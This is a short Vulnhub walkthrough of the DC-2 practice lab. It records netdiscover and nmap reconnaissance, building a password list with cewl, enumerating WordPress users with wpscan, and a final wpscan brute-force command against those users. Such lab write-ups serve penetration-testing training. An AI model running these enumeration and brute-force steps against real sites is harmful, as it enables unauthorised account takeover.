# DC2 Vulnhub Walkthrough

#### Description

Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

As with the original DC-1, it's designed with beginners in mind.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

Just like with DC-1, there are five flags including the final flag.

And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.

#####In short, the only flag that really counts, is the final flag.


 # Scaning
  
  ### Reconnaissance 
  
Sudo netdiscover


![Screenshot from 2023-01-19 01-55-20](https://user-images.githubusercontent.com/108471951/213287257-c109721a-ccfa-4bd8-aea1-f42411a9f400.png)

Found the IP 192.168.0.131 


Firstly we have to identify the machine IP address using tool like NetDiscover 

### Nmap

nmap -sC -sV -p- 192.168.0.131


![Screenshot from 2023-01-19 01-57-13](https://user-images.githubusercontent.com/108471951/213287521-1a995297-b7d5-4679-a74d-2eb7047c0463.png)

so we can see it its a worpress site in nmap result.


#### http
#### Edit the /etc/host by giving the target ip and then visit the website.


 By searching the Ip in browser ,we can see in website footer its mentioned it is a wordpress website.

![Screenshot from 2023-01-16 17-00-08](https://user-images.githubusercontent.com/108471951/213288183-7462e484-ff1c-4f78-b14a-70669e3c415b.png)




#### In website We found Flag1


![Screenshot from 2023-01-16 17-01-22](https://user-images.githubusercontent.com/108471951/213289621-ccb28013-29c2-4dbf-a771-0626321c8454.png)



As per the hint in the flag1 we have to create a new passwd list pass.txt from website by CEWL tool

#### cewl http://dc-2/ -w pass.txt

![Screenshot from 2023-01-19 02-17-57](https://user-images.githubusercontent.com/108471951/213291277-1f52d69a-ceca-4e99-b21d-99d1a7fed806.png)


So as we know its a wordpress website obviously lets run WPSCAN tool 

wpscan --url http://dc2/ -e

![Screenshot from 2023-01-19 02-24-39](https://user-images.githubusercontent.com/108471951/213292503-55fb0cf3-8a42-4d33-887d-31cfed6f06ac.png)


After enumerateing we found the users [admin, jerry, tom]   


 ![Screenshot from 2023-01-19 02-27-22](https://user-images.githubusercontent.com/108471951/213293686-6845895d-6360-4c74-9e5b-fcf8365bc5ab.png)
 
 

Then make a File users.txt with the user names we found 

#### Bruteforce

wpscan --url http://dc2/ -U user.txt -P pass.txt


 
